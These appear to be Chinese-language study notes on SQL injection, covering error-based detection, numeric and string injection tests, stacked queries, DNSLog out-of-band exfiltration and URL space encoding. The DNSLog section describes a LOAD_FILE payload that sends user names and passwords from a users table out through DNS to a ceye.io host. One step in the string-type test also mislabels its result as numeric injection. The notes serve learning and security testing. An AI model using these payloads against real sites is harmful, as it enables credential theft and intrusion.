如果在一个 URL 参数后多加一个引号 导致页面报错，那么就说明这个参数（注入点）的值直接被当作了 SQL 代码的一部分，因此存在注入漏洞。

但是如果没有报错只是返回不正常不代表没有注入点，可以进行数字型和字符型注入点检测进一步排查。

数字型检测-select * from <表名> where <列名> = x

当输入变量的类型为数字类型时，可以使用and 1=1和and 1=2配合进行注入点类型进行检测:

  1. Url 地址中输入 http://xxx/abc.php?id=x and 1=1 页面依旧运行正常，继续进行下一步。
  2. Url 地址中继续输入 http://xxx/abc.php?id=x and 1=2 页面运行错误，则说明此 Sql 注入为数字型注入。

如果注入点类型为字符型，注意这里也可能会返回结果，因为MySQL存在隐式转换，可能会将字符串x and 1=1转换为x

字符型注入点检测-select * from <表名> where <列名> = ‘x’

1.Url 地址中输入 http://xxx/abc.php?id=x' and '1'='1 页面依旧运行正常，继续进行下一步。

2.Url 地址中继续输入 http://xxx/abc.php?id= x' and '1'='2 页面运行错误，则说明此 Sql 注入为数字型注入。

mysqli_multi_query 函数用于执行一个 SQL 语句，或者多个使用分号分隔的 SQL 语句。这个就是堆叠注入产生的原因，因为本身就支持多个 SQL 语句。

DNSLog数据外带
  1. ?id=1';: 闭合了 id 字段的单引号，并开始一个新的查询。
  2. SELECT load_file(CONCAT(...)): 调用 LOAD_FILE 函数，强制进行网络访问。
  3. HEX(CONCAT_WS('~', username, password)) FROM users limit 0,1: 提取第一个用户的 username 和 password，用 ~ 分隔后，全部编码成 Hex 字符串。
  4. '\\\\' + Hex 数据 + '.gvc791.ceye.io\\abc': 构造出完整的 UNC 路径和恶意域名，例如： \\61646d696e7e70617373776f7264.gvc791.ceye.io\abc
  5. --+: 注释掉 SQL 语句的剩余部分。

执行结果是 MySQL 服务器尝试解析 61646d696e7e70617373776f7264.gvc791.ceye.io 这个域名，数据即通过 DNS 协议成功外带。

需要条件：

  1. MySQL 开启 load_file ()
  2. DNSLog 平台 （Hyuga、CEYE）
  3. Windows 平台:因为 LOAD_FILE() 函数只有在 Windows 系统中支持解析 UNC 路径，从而触发 DNS 查询。

关于URL中的空格

我们在浏览器地址栏输入网址时，会调用类似strip的函数去除首尾的空格,所以最末尾的空格必须用其它符号代替。

由于历史遗留和两种编码规范的混用，空格在URL中有两种表现形式：

  1. 通用 URI 编码（RFC 3986）：它规定空格应编码为 %20。它规定 + 号是一个 保留字符（通常不需编码，除非作为数据）。
  2. HTML 表单数据编码（application/x-www-form-urlencoded）：这是 HTML 表单提交数据（无论是 GET 的查询字符串还是 POST 的请求体）时使用的规范。这个规范专门规定空格应编码为 +，而 + 号本身如果作为数据内容，则必须编码为 %2B。

为了避免混淆，建议遵循以下“部位”编码原则：

  • URL 路径部分（? 问号之前的部分）：空格只能使用 %20。

  • URL 查询字符串部分（? 问号之后的部分）：空格 建议使用 +，因为它符合 x-www-form-urlencoded 的标准，且广泛被服务器接受并正确解析为空格。

  • POST 请求体：

    • 如果 Content-Type 是 application/x-www-form-urlencoded，则空格使用 +。

    • 如果 Content-Type 是 application/json 或其他非表单格式，则请求体中的数据（如果需要 URL 编码）使用 %20。
